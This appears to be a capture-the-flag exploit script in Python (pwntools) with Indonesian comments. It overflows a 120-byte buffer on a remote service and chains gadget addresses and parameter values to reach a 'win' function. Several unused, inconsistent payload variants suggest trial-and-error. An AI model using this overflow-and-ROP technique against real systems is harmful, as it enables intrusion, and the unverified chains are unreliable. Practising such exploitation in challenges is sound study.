from pwn import *


p = remote("103.185.44.122", 19001)

offset = 120  # Sesuaikan sesuai dengan ukuran buffer lokal

# Buat payload
padding = b'A' * offset  # Isi buffer dengan karakter A (sampaikan alamat return pointer)
rdi = p64(0x40121e)
rsi = p64(0x401220)
rdx = p64(0x401222)
param1 = p64(0xdeadbeefdeadbeef)  # Ganti nilai ini dengan nilai yang diharapkan untuk param_1
param2 = p64(0xabcd1234dcba4321)  # Ganti nilai ini dengan nilai yang diharapkan untuk param_2
param3 = p64(0x147147147147147)  # Ganti nilai ini dengan nilai yang diharapkan untuk param_3
win = p64(0x401227)
ret = p64(0x40101a)



payload = padding+rdi+rsi+rdx+param1+param2+param3+win
payload2 = padding+rdi+rsi+rdx+param3+win
payload3 = padding+rdi+rsi+rdx+ret+win
payload4 = padding+rdi+param1+rsi+param2+rdx+param3+win
payload5 = padding+rdi+param1+rsi+param2+rdx+param3+win
payload6 = padding+win+param1+param2+param3

# Kirim payload

p.sendline(payload)
# Baca output dari program
p.interactive()
# from pwn import *

# # Konfigurasi koneksi
# p = remote("103.185.44.122", 19001)

# offset = 120  # Sesuaikan sesuai dengan ukuran buffer lokal

# # Buat payload
# padding = b'A' * offset  # Isi buffer dengan karakter A (sampaikan alamat return pointer)
# param1 = p64(0x2152411021524111)  # Ganti nilai ini dengan nilai yang diharapkan untuk param_1
# param2 = p64(0x5432edcb2345bcdf)  # Ganti nilai ini dengan nilai yang diharapkan untuk param_2
# param3 = p64(0x147147147147147)  # Ganti nilai ini dengan nilai yang diharapkan untuk param_3
# win = p64(0x401227)  # Ganti dengan alamat fungsi win() dalam program Anda

# payload = padding + param1 + param2 + param3 + win

# # Kirim payload
# p.recvuntil("Give me your payload: ")
# p.sendline(payload)

# # Baca output dari program
# print(p.recvall().decode())
